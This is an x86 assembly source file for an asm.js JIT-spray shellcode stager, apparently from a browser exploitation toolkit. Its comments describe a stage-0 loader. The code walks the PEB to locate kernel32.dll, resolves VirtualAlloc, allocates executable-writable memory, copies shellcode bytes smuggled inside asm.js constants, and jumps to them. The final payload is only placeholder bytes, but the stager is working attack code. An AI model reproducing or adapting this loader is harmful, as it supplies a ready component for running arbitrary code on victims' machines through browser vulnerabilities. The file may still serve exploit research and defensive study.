;  
;    do not edit this file, otherwise sc2asm.py won't create
;    a correct stage0 loader, unless you know what you are doing
;
;    ## naive asm.js shellcode stager ## 
;
;    *) code is standalone and position independent, test it after assembling, i.e:
;       $ nasm -f coff <in.asm> -o <out.obj>
;       $ i686-w64-mingw32-ld <out.obj> -o <out.exe>
;    *) asm.js jitted regions are RX, hence we need RWX for poly/metamorphic
;       shellcodes.
;
;    *) max. shellcode size is 0x400 (currently hardcoded)
;
;    *) this was floating code, hence, comments may have not been updated and
;       may be wrong
;
;    *) stager performs the following:
;
;    1) locate kernel32!VirtualAlloc
;    2) allocate RWX memory
;    3) copy shellcode to RWX memory
;    4) jmp to it
;


;SECTION .text
; will be replaced dependent on options of sc2asm.py 
%define PAYLOAD_SIZE 0x3
BITS 32
;global _start
_start:
; get DLL Initialization order list 
xor ebx, ebx
mov bl, 0x30
mov ebx, [fs:ebx]            ; addr of process environment block (&PEB FS:[0]+0x30)
mov ebx, [ebx + 0x0C]        ; addr of nt.dll loader: PEB+0xC : &Loader
mov ebx, [ebx + 0x1C]        ; addr of loader.InitOrder: Loader+0x1c: dll InitOrder List

; push 'kernel32.dll\0\0\0\0'
push 0
mov ecx, '.DLL'
push ecx
mov ecx, 'EL32'
push ecx
mov ecx, 'KERN'
push ecx

; search for kernel32.dll in memory
NextModule:
    push 14
    pop ecx
    mov edi, esp                 ; addr of KERNEL.DLL string
    dec edi
    mov ebp, [ebx + 0x08]        ; base addr of module
    mov esi, [ebx + 0x20]        ; PTR to unicode name of module
    mov ebx, [ebx]               ; addr of next module
    isCharEqual:
        inc edi
        dec ecx
            jecxz GetFuncOrd     ; break if found
        xor eax, eax
        lodsw
        cmp al, 0x61
        jl SHORT isUpper
            sub al, 0x20
        isUpper:
        cmp al, [edi]
        je SHORT isCharEqual
    jmp SHORT NextModule

GetFuncOrd:
    ; push VirtualAlloc\0
    push 0
    mov ecx, 'lloc'
    push ecx
    mov ecx, 'ualA'
    push ecx
    mov ecx, 'Virt'
    push ecx

    mov ebx, ebp            ; module base
    add ebp, 0x3c           ; PE header offset
    mov ebp, [ebp]          ; PE header address
    add ebp, ebx            ; PE header
    add ebp, 0x78           ; export table offset
    mov ebp, [ebp]          ; export table address
    add ebp, ebx            ; export table
    mov eax, [ebp + 0x20]   ; ptr to names
    add eax, ebx            ; absolute
    xor edx, edx

    NextFunc:
        mov edi, esp            ; addr of VirtualAlloc\0
        push 13
        pop ecx                 ; len(VirtualAlloc\0)
        mov esi, [eax + edx]
        add esi, ebx
        repe cmpsb              ; repe cmpsb [esi], [esi]
            jecxz GetFuncAddr 
        add edx, 4
        jmp SHORT NextFunc
        
GetFuncAddr:
    mov edi, [ebp + 0x24]   ; address of ordinals
    add edi, ebx            ; add base
    shr edx, 1
    add edi, edx            ; add ordinal index
    xor edx, edx
    mov dx, [edi]           ; get ordinal
    mov edi, [ebp + 0x1c]   ; address of function addresses
    add edi, ebx            ; add base
    shl edx, 2
    add edi, edx            ; add function ptr index
    mov edi, [edi]          ; relative VirtualAlloc in edi
    add edi, ebx            ; VirtualAlloc in edi

CallVirtualAlloc:

    push 0x40               ; flProtect PAGE_EXECUTE_READWRITE
    xor eax, eax
    mov ah, 0x30
    push eax                ; flAllocationType MEM_COMMIT | MEM_RESERVE
    mov ah, 0x10
    push eax                ; dwSize 0x1000 
    push 0
    call edi                ; VirtualAlloc; RWX region returned in EAX
    xor ecx, ecx            
    mov ch, (PAYLOAD_SIZE >> 8) & 0xff
    mov cl, PAYLOAD_SIZE & 0xff
    
GetPC: 
    fldpi
    fnstenv [esp]
    mov esi, esp
    add esi, 0xc
    mov esi, [esi]          ; GetPC in ESI
    add esi, (Shellcode - GetPC) ; Shellcode in ESI
    mov edi, eax            ; RWX reagion in EDI
    
; read shellcode opcode bytes hidden in asm.js constants and write them to RWX memory
CopyShellcode:
    mov bx, [esi]
    mov [edi], bx           ; copy 2 hidden bytes
    add esi, 2
    add edi, 2
    mov byte bl, [esi]
    mov [edi], bl           ; copy 1 hidden byte
    add esi, 3              ; skip asm.js opcode bytes
    add edi, 1
    sub ecx, 3
    jecxz Jmp2Shellcode     ; (***1)
    jmp CopyShellcode
    
Jmp2Shellcode:
    jmp eax                 ; never return
    
; will be replaced; DO NOT EDIT
; need shellcode_size % 3 == 0 (***1)
Shellcode:
    ;add eax, 0xa8909090 ; 05909090a8
    ;add eax, 0xa8909090 ; 05909090a8
    ;add eax, 0xa8909090 ; 05909090a8
    ;add eax, 0xa8909090 ; 05909090a8
    ;add eax, 0xa89090cc ; 05cc9090a8

    ; 41 42 43 41 42 43 ... cc
    ;add eax, 0xa8434241 ; 05909090a8
    ;add eax, 0xa8434241 ; 05909090a8
    ;add eax, 0xa8434241 ; 05909090a8
    ;add eax, 0xa8434241 ; 05909090a8
    ;add eax, 0xa89090cc ; 05cc9090a8

    ; alignement
    lea esp, [esp] ; 3 byte nop
    ;nop
    ;nop
    ;int3
